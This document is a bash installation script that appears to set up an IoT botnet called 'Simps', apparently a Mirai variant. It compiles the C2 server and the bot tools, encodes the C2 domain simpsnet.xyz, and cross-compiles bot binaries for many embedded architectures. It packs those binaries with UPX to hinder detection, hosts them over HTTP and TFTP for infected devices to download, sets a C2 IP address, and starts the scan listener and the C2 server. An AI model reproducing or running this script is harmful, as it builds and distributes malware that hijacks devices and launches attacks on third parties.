#!/bin/bash
# changeme
echo "Installing Everything Necessary"
apt update -y
apt upgrade -y
apt install gcc build-essential apache2 tftp tftpd xinetd screen nano wget python perl dstat php golang electric-fence zmap whois mysql-server mysql-client gengetopt nload gdb geany python3-colorama -y #python-pip python-requests python-paramiko python-colorama python3-colorama -y
#pip install requests
ulimit -n 999999
ulimit -u unlimited
ulimit -e unlimited
ulimit -s unlimited
echo "Creating Cnc"
cd cnc
gcc c2.c -o c2 -pthread -g -w
gcc cc.c -o cc -g -w
rm -rf cc.c
cd
cd Botnet
cd tools
gcc botencrypt.c -o botencrypt -g -w
gcc dec.c -o dec -g -w
gcc enc.c -o enc -g -w
./enc string simpsnet.xyz # this is for the table enc
gcc encrypt.c -o encrypt -g -w
./encrypt encrypt simpsnet.xyz
gcc portgen.c -o portgen -g -w
./portgen
gcc badbot.c -o badbot -g -w
gcc xor.c -o xor -g -w
rm -rf botenc.c
rm -rf botencrypt.c
rm -rf dec.c
rm -rf enc.c
rm -rf encrypt.c
rm -rf portgen.c
rm -rf badbot.c
echo "Creating folder /etc/xcompile"
mkdir /etc/xcompile >/dev/null 2>&1
cd
cd /etc/xcompile
rm -rf *
echo "Installing All Cross Compilers"
wget https://cdn.discordapp.com/attachments/819624045632028724/827230981727322212/cross-compiler-mips.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827232616801107988/cross-compiler-mipsel_2.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231594896818227/cross-compiler-sh4.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231638324117585/cross-compiler-x86_64.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827232213639757834/cross-compiler-armv6l_1.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231706082967602/cross-compiler-i686.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231790539341824/cross-compiler-i586.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231835389165568/cross-compiler-m68k.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231910685835264/cross-compiler-sparc.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231967148769330/cross-compiler-armv4l.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231999004770314/cross-compiler-armv5l.tar.bz2
wget https://cdn.discordapp.com/attachments/737802958800158741/748823939442278400/cross-compiler-armv7l.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827232024728698930/cross-compiler-powerpc-440fp.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
echo "Copy cross-compiler-armv4l.tar.bz2 to /etc/xcompile"
cp cross-compiler-armv4l.tar.bz2 /etc/xcompile/cross-compiler-armv4l.tar.bz2
echo "Copy cross-compiler-armv5l.tar.bz2 to /etc/xcompile"
cp cross-compiler-armv5l.tar.bz2 /etc/xcompile/cross-compiler-armv5l.tar.bz2
echo "Copy cross-compiler-armv6l.tar.bz2 to /etc/xcompile"
cp cross-compiler-armv6l_1.tar.bz2 /etc/xcompile/cross-compiler-armv6l.tar.bz2
echo "Copy cross-compiler-armv7l.tar.bz2 to /etc/xcompile"
cp cross-compiler-armv7l.tar.bz2 /etc/xcompile/cross-compiler-armv7l.tar.bz2
echo "Copy cross-compiler-i586.tar.bz2 to /etc/xcompile"
cp cross-compiler-i586.tar.bz2 /etc/xcompile/cross-compiler-i586.tar.bz2
echo "Copy cross-compiler-i686.tar.bz2 to /etc/xcompile"
cp cross-compiler-i686.tar.bz2 /etc/xcompile/cross-compiler-i686.tar.bz2
echo "Copy cross-compiler-m68k.tar.bz2 to /etc/xcompile"
cp cross-compiler-m68k.tar.bz2 /etc/xcompile/cross-compiler-m68k.tar.bz2
echo "Copy cross-compiler-mips.tar.bz2 to /etc/xcompile"
cp cross-compiler-mips.tar.bz2 /etc/xcompile/cross-compiler-mips.tar.bz2
echo "Copy cross-compiler-mipsel.tar.bz2 to /etc/xcompile"
cp cross-compiler-mipsel_2.tar.bz2 /etc/xcompile/cross-compiler-mipsel.tar.bz2
echo "Copy cross-compiler-powerpc.tar.bz2 to /etc/xcompile"
cp cross-compiler-powerpc.tar.bz2 /etc/xcompile/cross-compiler-powerpc.tar.bz2
echo "Copy cross-compiler-sh4.tar.bz2 to /etc/xcompile"
cp cross-compiler-sh4.tar.bz2 /etc/xcompile/cross-compiler-sh4.tar.bz2
echo "Copy cross-compiler-sparc.tar.bz2 to /etc/xcompile"
cp cross-compiler-sparc.tar.bz2 /etc/xcompile/cross-compiler-sparc.tar.bz2
echo "Copy cross-compiler-x86_64.tar.bz2 to /etc/xcompile"
cp cross-compiler-x86_64.tar.bz2 /etc/xcompile/cross-compiler-x86_64.tar.bz2
echo "Copy cross-compiler-powerpc-440fp.tar.bz2 to /etc/xcompile"
cp cross-compiler-powerpc-440fp.tar.bz2 /etc/xcompile/cross-compiler-powerpc-440fp.tar.bz2
cd /etc/xcompile
echo "extracting cross-compiler-armv4l.tar.bz2"
tar -jxf cross-compiler-armv4l.tar.bz2
echo "extracting cross-compiler-armv5l.tar.bz2"
tar -jxf cross-compiler-armv5l.tar.bz2
echo "extracting cross-compiler-armv6l.tar.bz2"
tar -jxf cross-compiler-armv6l.tar.bz2
echo "extracting cross-compiler-armv7l.tar.bz2"
tar -jxf cross-compiler-armv7l.tar.bz2
echo "extracting cross-compiler-i586.tar.bz2"
tar -jxf cross-compiler-i586.tar.bz2
echo "extracting cross-compiler-i686.tar.bz2"
tar -jxf cross-compiler-i686.tar.bz2
echo "extracting cross-compiler-m68k.tar.bz2"
tar -jxf cross-compiler-m68k.tar.bz2
echo "extracting cross-compiler-mips.tar.bz2"
tar -jxf cross-compiler-mips.tar.bz2
echo "extracting cross-compiler-mipsel.tar.bz2"
tar -jxf cross-compiler-mipsel.tar.bz2
echo "extracting cross-compiler-powerpc.tar.bz2"
tar -jxf cross-compiler-powerpc.tar.bz2
echo "extracting cross-compiler-sh4.tar.bz2"
tar -jxf cross-compiler-sh4.tar.bz2
echo "extracting cross-compiler-sparc.tar.bz2"
tar -jxf cross-compiler-sparc.tar.bz2
echo "extracting cross-compiler-x86_64.tar.bz2"
tar -jxf cross-compiler-x86_64.tar.bz2
echo "extracting cross-compiler-powerpc-440fp.tar.bz2"
tar -jxf cross-compiler-powerpc-440fp.tar.bz2
echo "removing all tar.bz2 from /etc/xcompile"
rm *.tar.bz2
echo "move cross-compiler-armv4l to armv4l"
mv cross-compiler-armv4l armv4l
echo "move cross-compiler-armv5l to armv5l"
mv cross-compiler-armv5l armv5l
echo "move cross-compiler-armv6l to armv6l"
mv cross-compiler-armv6l armv6l
echo "move cross-compiler-armv7l to armv7l"
mv cross-compiler-armv7l armv7l
echo "move cross-compiler-i586 to i586"
mv cross-compiler-i586 i586
echo "move cross-compiler-i686 to i686"
mv cross-compiler-i686 i686
echo "move cross-compiler-m68k to m68k"
mv cross-compiler-m68k m68k
echo "move cross-compiler-mips to mips"
mv cross-compiler-mips mips
echo "move cross-compiler-mipsel to mipsel"
mv cross-compiler-mipsel mipsel
echo "move cross-compiler-powerpc to powerpc"
mv cross-compiler-powerpc powerpc
echo "move cross-compiler-sh4 to sh4"
mv cross-compiler-sh4 sh4
echo "move cross-compiler-sparc to sparc"
mv cross-compiler-sparc sparc
echo "move cross-compiler-x86_64 to x86_64"
mv cross-compiler-x86_64 x86_64
echo "move cross-compiler-powerpc-440fp to powerpc-440"
mv cross-compiler-powerpc-440fp powerpc-440fp
echo "export PATH armv4l"
export PATH=$PATH:/etc/xcompile/armv4l/bin
echo "export PATH armv5l"
export PATH=$PATH:/etc/xcompile/armv5l/bin
echo "export PATH armv6l"
export PATH=$PATH:/etc/xcompile/armv6l/bin
echo "export PATH armv7l"
export PATH=$PATH:/etc/xcompile/armv7l/bin
echo "export PATH i586"
export PATH=$PATH:/etc/xcompile/i586/bin
echo "export PATH i686"
export PATH=$PATH:/etc/xcompile/i686/bin
echo "export PATH m68k"
export PATH=$PATH:/etc/xcompile/m68k/bin
echo "export PATH mips"
export PATH=$PATH:/etc/xcompile/mips/bin
echo "export PATH mipsel"
export PATH=$PATH:/etc/xcompile/mipsel/bin
echo "export PATH powerpc"
export PATH=$PATH:/etc/xcompile/powerpc/bin
echo "export PATH sh4"
export PATH=$PATH:/etc/xcompile/sh4/bin
echo "export PATH sparc"
export PATH=$PATH:/etc/xcompile/sparc/bin
echo "export PATH x86_64"
export PATH=$PATH:/etc/xcompile/x86_64/bin
echo "export PATH powerpc-440fp"
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
echo "Go Path"
rm -rf /usr/local/go
cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q --no-check-certificate -c
tar -xzf go1.13.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env
cd
cd /var/www/html
rm -rf *
echo "Setting Up Net"
cd
chmod 777 *
cd Botnet
chmod 777 *
./build.sh debug
./build.sh release
mkdir /var/www/html/Simps
cp /root/Botnet/release/* /var/www/html/Simps
cd
cd Botnet
cd tools
rm -rf xor.c
cd
cd Botnet/dlr
chmod 777 *
./build.sh
cd release
chmod 777 *
python hex.py
cd
cd Botnet/loader
chmod 777 *
./build.sh
./build.debug.sh
cp /root/Botnet/dlr/release/* /root/Botnet/loader/bins/
cp /root/Botnet/debug/scanListen /root/Botnet/loader
cd
cd Botnet/cnc
chmod 777 *
rm -rf c2.c
./cc 45.14.224.127 #1.1.1.1
mkdir /var/lib/tftpboot
cd
cd /var/lib/tftpboot
rm -rf *
cd
mv /root/Botnet/cnc/ur0a.sh /var/www/html
mv /root/Botnet/cnc/tftp* /var/lib/tftpboot
cd
cd /var/lib/tftpboot
chmod 777 *
cd
cd Botnet
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/Simps/*
./upx --ultra-brute /var/lib/tftpboot/*
rm -rf upx*
mv /root/Botnet/tools/shell /var/www/html
mv /root/Botnet/index.html /var/www/html
rm -rf *.sh
rm -rf *.txt
rm -rf *.md
#wget https://cdn.discordapp.com/attachments/817516039914913792/819013937256333313/index.html
mv /root/Botnet/tools/index.html /var/www/html/Simps
cd
cd Botnet
cd ReadMe
chmod 777 *
cd
cd Botnet
cd debug
chmod 777 *
echo "Screen The scanListen."
screen ./scanListen
cd
cd Botnet
cd cnc
chmod 777 *
clear
clear
echo "Screen The Cnc."
screen ./c2
